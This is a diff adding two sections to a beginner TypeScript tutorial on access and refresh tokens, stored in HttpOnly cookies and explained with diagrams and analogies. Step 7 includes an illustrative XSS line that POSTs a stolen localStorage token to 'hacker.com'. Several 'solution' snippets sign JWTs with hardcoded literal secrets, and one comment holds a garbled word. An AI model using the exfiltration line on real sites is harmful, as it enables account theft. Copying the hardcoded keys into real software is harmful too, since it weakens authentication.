@@ -430,3 +430,206 @@ const staffGuard = SecurityAgency.hireGuard("STAFF");
 console.log(vipGuard("Anis", "Normal"));  // ❌ Anis blocked! Needs VIP access.
 console.log(vipGuard("Muntasir", "VIP")); // ✅ Muntasir allowed!
 ```
+
+---
+
+### Step 6: Access Token vs Refresh Token Architecture
+
+```mermaid
+sequenceDiagram
+    actor Client
+    participant Server
+    
+    Note over Client,Server: ❌ Scenario 1: Access Token Expired
+    Client->>Server: Request Data (with short-lived Access Token)
+    Server-->>Client: ❌ 401 Unauthorized (Token Expired / Short Expire Time)
+    
+    Note over Client,Server: ✅ Scenario 2: Getting a New Token
+    Client->>Server: Request New Access Token (Sends Refresh Token from 🍪 Cookies)
+    Server-->>Client: ✅ Automatically Returns New Access Token
+```
+
+*   **What it is:** In an authentication system, an **Access Token** is a temporary key used to access protected routes. A **Refresh Token** is a longer-lasting key (recommended to be stored securely in browser cookies) that silently requests a new Access Token behind the scenes when the old one expires.
+*   **The Problem:** If we give a user a single Access Token that lasts for 30 days, it is critically dangerous! If a hacker steals it, they have 30 days to ruin the account. But if we make the Access Token last only 10 minutes for security, the user will be forced to manually type their email and password every 10 minutes when it expires. This creates a terrible user experience.
+
+**Problem Code:**
+```typescript
+// ❌ Problem: Single Long-Lived Token (Extremely Insecure!)
+const loginUser = (req: Request, res: Response) => {
+    // ⚠️ Giving an access token that lasts 30 days. If stolen, game over!
+    const accessToken = jwt.sign({ id: user.id }, "secret", { expiresIn: '30d' });
+    
+    res.status(200).json({ token: accessToken });
+};
+```
+
+*   **The Solution:** We use a **Dual-Token System**, as shown in the picture. We issue an Access Token that dies very quickly (e.g., 10 minutes) for safety. To prevent the user from re-logging in repeatedly, we also issue a **Refresh Token** that lives longer (e.g., 30 days). We store this Refresh Token in an `HttpOnly Cookie` (as recommended in the architecture) so hackers can't easily steal it using JavaScript.
+
+**Solution Code:**
+```typescript
+// ✅ Solution: Dual-Token System 
+const loginUser = (req: Request, res: Response) => {
+    // 1. Short-lived Access Token (e.g., 10 minutes)
+    const accessToken = jwt.sign({ id: user.id }, "sec_key", { expiresIn: '10m' });
+    
+    // 2. Long-lived Refresh Token (e.g., 30 days)
+    const refreshToken = jwt.sign({ id: user.id }, "ref_key", { expiresIn: '30d' });
+
+    // 🍪 3. Recommended: Store Refresh Token in an HttpOnly Cookie for security
+    res.cookie('refreshToken', refreshToken, {
+        httpOnly: true, // Prevents JavaScript/XSS attacks from stealing the token
+        secure: true,
+    });
+
+    // 4. Send only the short-lived access token to the frontend client
+    res.status(200).json({ accessToken });
+};
+
+// ♻️ The Route that gives a NEW Access token using the Cookie
+const getNewAccessToken = (req: Request, res: Response) => {
+    // Grab the refresh token directly from the isolated cookie!
+    const refreshToken = req.cookies.refreshToken;
+    // ... logic to verify it, and generate a new Access Token silently
+};
+```
+
+*   💡 **Real-Life Analogy:** **Hotel Room Keycard vs Identity Proof**. 
+    *   **Access Token (The Room Keycard):** When you stay at a hotel, they give you a keycard. For security, the keycard is programmed to expire every 24 hours. (If you drop it, a stranger can only use it briefly).
+    *   **Refresh Token (Your Passport/Booking ID):** When your keycard stops working the next day, you don't book the room again! You go to the reception, show your Passport (Refresh Token) secretly, and they instantly give you a brand-new freshly activated room keycard (New Access Token).
+
+**Analogy Code:**
+```typescript
+class HotelSystem {
+    // 💳 Access Token functionality
+    openDoor(keycardExpireDate: number, roomNumber: number) {
+        if (Date.now() > keycardExpireDate) {
+            console.log(`❌ Keycard Expired! Cannot enter Room ${roomNumber}.`);
+            return false;
+        }
+        console.log(`✅ Welcome to Room ${roomNumber}!`);
+        return true;
+    }
+
+    // 🛂 Refresh Token functionality
+    renewKeycard(passport: string, databaseRecord: string) {
+        if (passport === databaseRecord) {
+            console.log(`♻️ Identity verified using Passport. Issuing a new 24-hour Keycard!`);
+            return Date.now() + 24 * 60 * 60 * 1000; // New expiry!
+        }
+    }
+}
+
+// Execution Scenario
+const hilton = new HotelSystem();
+let myKeycardExpiry = Date.now() - 1000; // ⚠️ Oh no, it expired 1 second ago!
+
+// 1. Try to open door (Fails - Short expire time just like in the picture)
+hilton.openDoor(myKeycardExpiry, 101);
+
+// 2. Secretly use Passport (Refresh Token) to get a new Keycard
+console.log("➡️ Going to reception to use Refresh Token...");
+myKeycardExpiry = hilton.renewKeycard("RealPassport", "RealPassport");
+
+// 3. Try again with the New Keycard (Success!)
+hilton.openDoor(myKeycardExpiry, 101);
+```
+
+---
+
+### Step 7: Security Lifecycle & The Hacker Scenario
+
+```mermaid
+flowchart TD
+    %% Hacker Scenario
+    subgraph Hacker Attack
+        H([🥷 Hacker]) -- "Steals Access Token" --> Req[Send Request]
+        Req -- "Short Expire Time limit reached" --> Server[(Server)]
+        Server -- "❌ Access Denied" --> H
+    end
+
+    %% Normal User Cycle
+    subgraph Secure Token Cycle
+        Browser[💻 Browser Cookie] -- "Sends Refresh Token" --> S2[(Server)]
+        S2 -- "Issues New Access Token" --> AT[Access Token]
+        AT -- "Valid for Short Time" --> Request[Protected Request]
+    end
+```
+
+*   **What it is:** The visual representation of how the Dual-Token system actively defends your application against a Man-in-the-Middle (Hacker) attack, completing the full token cycle.
+*   **The Problem:** Hackers can use script injections (XSS) or intercept network traffic to easily steal an `Access Token` when a user makes a request. If the token never expires, the hacker owns the account permanently.
+
+**Problem Code:**
+```typescript
+// ❌ Problem: Tokens stored insecurely in LocalStorage are easy to steal!
+// Frontend Code (React/Vue)
+localStorage.setItem('accessToken', token);
+
+// 🥷 Hacker executes this script on your site and steals it!
+const stolenToken = localStorage.getItem('accessToken');
+fetch('https://hacker.com/steal', { method: 'POST', body: stolenToken });
+```
+
+*   **The Solution:** The architecture enforces two immense security rules:
+    1.  **Short Access Token:** Even if the hacker runs the steal script, the token will quickly hit its "Short Expire Time" (e.g., 5 mins). By the time the hacker tries to use it, the Server replies with **"Access Denied"**.
+    2.  **HttpOnly Refresh Token:** The Refresh Token, which is the "master key" to generate new tokens, is locked inside an `HttpOnly` Browser Cookie. JavaScript cannot read this cookie! The hacker's script returns `undefined`.
+
+**Solution Code:**
+```typescript
+// ✅ Solution: Hacker is blocked at both ends!
+
+// 1. Server sends Refresh Token strictly via HttpOnly Cookie
+res.cookie('refreshToken', refreshToken, {
+    httpOnly: true, // 🛡️ JavaScript cannot access this! Hacker scripts fail!
+    secure: true,   // Only sent over HTTPS
+    maxAge: 30 * 24 * 60 * 60 * 1000 // 30 days
+});
+
+// 2. Client uses it to get a new short-lived token
+app.post('/refresh-token', (req, res) => {
+    //  брауজার automatically attaches the invisible cookie
+    const token = req.cookies.refreshToken; 
+    
+    if(!token) return res.status(403).send("No refresh token found");
+
+    // Re-issue a NEW 5-minute token
+    const newAccessToken = jwt.sign({ id: user.id }, "secret", { expiresIn: '5m' });
+    res.json({ accessToken: newAccessToken });
+});
+```
+
+*   💡 **Real-Life Analogy:** **A Bank Vault Time Lock**. 
+    *   **The Hacker Situation:** A thief steals your vault's combination code (Access Token). 
+    *   **The Defense:** The vault randomly changes its combination every 5 minutes (Short Expire Time). By the time the thief drives to the bank, the combination is useless. Only YOU have the master retinal scan (HttpOnly Refresh Token) to ask the Bank Manager for the new 5-minute combination. The thief cannot steal your eye.
+
+**Analogy Code:**
+```typescript
+class BankVault {
+    private combinationCode: string;
+
+    constructor() {
+        this.combinationCode = "1234";
+        // ⏱️ Auto-changes combination very quickly
+        setTimeout(() => {
+            this.combinationCode = "EXP_5678";
+            console.log("🔄 Vault combination rotated for security.");
+        }, 5000); 
+    }
+
+    openVault(code: string, user: string) {
+        if (code !== this.combinationCode) {
+            console.log(`❌ Access Denied for ${user}. Invalid or Expired Code!`);
+        } else {
+            console.log(`✅ Vault successfully opened by ${user}.`);
+        }
+    }
+}
+
+const dbbl = new BankVault();
+const myCode = "1234"; // Hacker steals this!
+
+// 🥷 Hacker tries 6 seconds later...
+setTimeout(() => {
+    console.log("🥷 Hacker attempting to sneak in...");
+    dbbl.openVault(myCode, "Hacker"); // ❌ Fails! Automatically protected.
+}, 6000);
+```
